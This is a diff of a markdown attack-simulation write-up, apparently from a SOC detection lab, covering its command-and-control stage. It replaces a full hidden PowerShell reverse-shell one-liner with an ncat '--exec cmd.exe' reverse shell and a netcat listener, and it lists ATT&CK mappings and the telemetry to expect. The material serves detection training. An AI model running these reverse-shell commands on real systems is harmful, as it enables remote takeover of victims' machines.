@@ -243,89 +243,39 @@ To **erase the Security Event Log**, removing records of authentication events, 
 
 ---
 
-# Stage 5 – Command and Control
+# Stage 5 – Command and Control (C2)
 
-The attacker establishes a **covert reverse-shell connection** from the compromised Windows host via PowerShell, enabling remote command execution without relying on external binaries such as Netcat.
+The attacker establishes a reverse shell from Windows using **Ncat**, enabling remote command execution via TCP.
 
----
+**Commands**
 
-## Commands Executed
-
-### Attacker (Kali Listener)
+* **Attacker (Kali):**
 
 ```bash
 nc -lvnp 4444
 ```
 
-### Victim (Windows PowerShell Reverse Shell)
+* **Victim (Windows):**
 
 ```powershell
-powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('<KALI_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+& "C:\Program Files (x86)\Nmap\ncat.exe" 192.168.255.128 4444 --exec cmd.exe
 ```
 
----
+**MITRE ATT&CK Mapping:** T1071 (Application Layer Protocol), T1059.003 (Command Shell), T1105 (Ingress Tool Transfer)
 
-## Objective
+**Expected Telemetry**
 
-To establish a **stealthy bidirectional command channel (C2)** between the attacker and victim system using native Windows tooling, enabling persistent remote control.
+* **Sysmon Event ID 1:** `ncat.exe` → `cmd.exe`
+* **Sysmon Event ID 3:** TCP connection to `192.168.255.128:4444`
+* **Windows Event ID 4688:** `ncat.exe` execution spawning `cmd.exe`
 
----
+**Notes:**
 
-## MITRE ATT&CK Mapping
-
-* **Technique:** T1071 – Application Layer Protocol
-* **Sub-technique:** T1071.001 – Web Protocols *(if adapted to HTTP/HTTPS)*
-* **Also Relevant:**
-
-  * T1059.001 – PowerShell
-  * T1105 – Ingress Tool Transfer
+* Clear parent-child process chain
+* Outbound network connection on uncommon port
+* Ideal for SOC detection and lab simulations
 
 ---
-
-## Expected Telemetry
-
-### 🔹 Sysmon Logs
-
-#### ✅ Event ID 1 – Process Creation
-
-* Image: `powershell.exe`
-* CommandLine contains:
-
-  * `-nop`
-  * `-w hidden`
-  * `TCPClient`
-
----
-
-#### ✅ Event ID 3 – Network Connection
-
-* Image: `powershell.exe`
-* Destination IP: `<KALI_IP>`
-* Destination Port: `4444`
-
-Strong indicator of reverse shell / C2 traffic
-
----
-
-### 🔹 PowerShell Logs
-
-#### ✅ Event ID 4104 – Script Block Logging
-
-Key indicators:
-
-* `System.Net.Sockets.TCPClient`
-* `iex` (Invoke-Expression)
-
----
-
-### 🔹 Windows Security Logs
-
-#### ✅ Event ID 4688 – Process Creation
-
-* New Process: `powershell.exe`
-
----
-
 
 ![Reverse Shell](screenshots/reverse-shell.png)
 *(Insert screenshot showing attacker shell session)*
